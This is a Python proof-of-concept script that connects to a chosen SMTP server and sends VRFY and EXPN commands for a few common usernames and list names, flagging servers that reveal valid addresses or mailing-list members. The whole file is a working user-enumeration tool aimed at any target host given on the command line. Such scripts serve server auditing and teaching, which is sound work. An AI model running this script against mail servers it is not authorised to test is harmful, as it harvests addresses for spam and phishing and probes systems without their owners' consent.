#!/usr/bin/env python3
"""
Proof-of-Concept: SMTP VRFY/EXPN Information Disclosure

This script demonstrates the vulnerability described in RFC 5321 Sections 3.5.1 and 7.3.
It connects to an SMTP server and attempts to use the VRFY and EXPN commands to harvest
valid email addresses or mailing list contents.

Usage:
    python poc_vrfy_expn_information_disclosure.py <target_host> [target_port]

Example:
    python poc_vrfy_expn_information_disclosure.py mail.example.com 25
"""

import sys
import socket
import time

# Default SMTP port
DEFAULT_SMTP_PORT = 25

# Timeout for socket operations
SOCKET_TIMEOUT = 10

# Sample usernames and mailing lists to test
# In a real scenario, an attacker might use wordlists or known patterns
TEST_USERS = ["admin", "root", "postmaster", "info", "user1"]
TEST_LISTS = ["staff", "employees", "newsletter", "announce"]


def send_command(sock, command):
    """
    Sends a command to the SMTP server and returns the response.
    Handles multiline responses by reading until the continuation character '-' is no longer present.
    """
    sock.sendall(f"{command}\r\n".encode())
    response_lines = []
    
    while True:
        line = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        if not line:
            break
        response_lines.append(line)
        # SMTP multiline responses start with a 3-digit code followed by '-'
        # The final line of a multiline response ends with a space ' ' instead of '-'
        if len(line) >= 4 and line[3] == ' ':
            break
            
    return "\n".join(response_lines)


def check_vrfy_expn(host, port):
    """
    Connects to the SMTP server and tests for VRFY and EXPN vulnerabilities.
    """
    print(f"[*] Connecting to {host}:{port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.connect((host, port))
        
        # Receive initial banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        print(f"[+] Server Banner: {banner}")
        
        # Send EHLO/HELO to initialize the session
        ehlo_response = send_command(sock, "EHLO poc-client.local")
        print(f"[+] EHLO Response: {ehlo_response.split(chr(13))[0]}") # Print first line only
        
        # --- Test VRFY Command ---
        print("\n[*] Testing VRFY command for user enumeration...")
        for user in TEST_USERS:
            try:
                cmd = f"VRFY {user}"
                response = send_command(sock, cmd)
                print(f"  -> {cmd}")
                print(f"     Response: {response}")
                
                # Analyze response
                if response.startswith("250"):
                    print("     [!] VULNERABLE: User verified successfully.")
                elif response.startswith("252"):
                    print("     [i] Server indicates verification is not possible (RFC 5321 compliant for security).")
                elif response.startswith("502") or response.startswith("500"):
                    print("     [i] Command not supported or disabled.")
                else:
                    print("     [i] User not found or ambiguous.")
            except Exception as e:
                print(f"     [x] Error during VRFY: {e}")
                break
            
        # --- Test EXPN Command ---
        print("\n[*] Testing EXPN command for mailing list disclosure...")
        for lst in TEST_LISTS:
            try:
                cmd = f"EXPN {lst}"
                response = send_command(sock, cmd)
                print(f"  -> {cmd}")
                print(f"     Response: {response}")
                
                # Analyze response
                if response.startswith("250"):
                    print("     [!] VULNERABLE: Mailing list expanded successfully.")
                elif response.startswith("252"):
                    print("     [i] Server indicates expansion is not possible (RFC 5321 compliant for security).")
                elif response.startswith("502") or response.startswith("500"):
                    print("     [i] Command not supported or disabled.")
                else:
                    print("     [i] List not found or access denied.")
            except Exception as e:
                print(f"     [x] Error during EXPN: {e}")
                break
                
        # Graceful disconnect
        send_command(sock, "QUIT")
        sock.close()
        print("\n[*] Connection closed.")
        
    except socket.timeout:
        print("[x] Connection timed out.")
    except ConnectionRefusedError:
        print("[x] Connection refused. Ensure the SMTP service is running on the target.")
    except Exception as e:
        print(f"[x] An error occurred: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc_vrfy_expn_information_disclosure.py <target_host> [target_port]")
        sys.exit(1)
        
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_SMTP_PORT
    
    print(f"=== SMTP VRFY/EXPN Information Disclosure PoC ===")
    print(f"Target: {target_host}:{target_port}")
    print("=" * 50)
    
    check_vrfy_expn(target_host, target_port)
